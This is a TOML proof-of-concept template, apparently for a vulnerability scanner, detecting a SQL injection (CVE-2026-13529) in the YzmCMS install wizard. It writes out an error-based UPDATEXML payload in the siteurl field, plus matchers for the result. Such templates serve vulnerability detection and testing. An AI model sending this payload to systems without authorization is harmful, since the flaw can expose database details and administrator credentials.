[info]
id = "POC-AVE-2026-0016"
name = "YzmCMS 安装向导 siteurl SQL注入 PoC"
author = "AVE"
severity = "high"
tags = ["sql-injection", "cve-2026-13529", "yzmcms", "cwe-89"]
description = "YzmCMS v7.5及之前版本安装向导Step 4站点配置中siteurl参数未过滤直接拼接入SQL UPDATE语句，攻击者可利用UPDATEXML函数报错注入提取数据库用户、版本及管理员凭据等信息。"
vuln_id = ["CVE-2026-13529", "AVE-2026-0016"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/index.php"

query.m = "install"
query.c = "index"
query.a = "step4"

headers.Content-Type = "application/x-www-form-urlencoded"

body.type = "form"
body.siteurl = "http://localhost' AND (updatexml(1,concat(0x7e,(SELECT md5(123)),0x7e),1)) AND '1'='1"
body.db_host = "localhost"
body.db_user = "root"
body.db_pass = ""
body.db_name = "yzmcms"
body.db_prefix = "yzm_"
body.admin_user = "admin"
body.admin_pass = "admin123"
body.admin_email = "admin@example.com"
body.submit = "1"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["202cb962ac59075b964b07152d234b70", "XPATH syntax error"]
expect = true

[[poc.requests]]
method = "GET"
path = "/index.php"

query.m = "install"
query.c = "index"
query.a = "step4"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["YzmCMS", "站点配置", "siteurl"]
expect = true
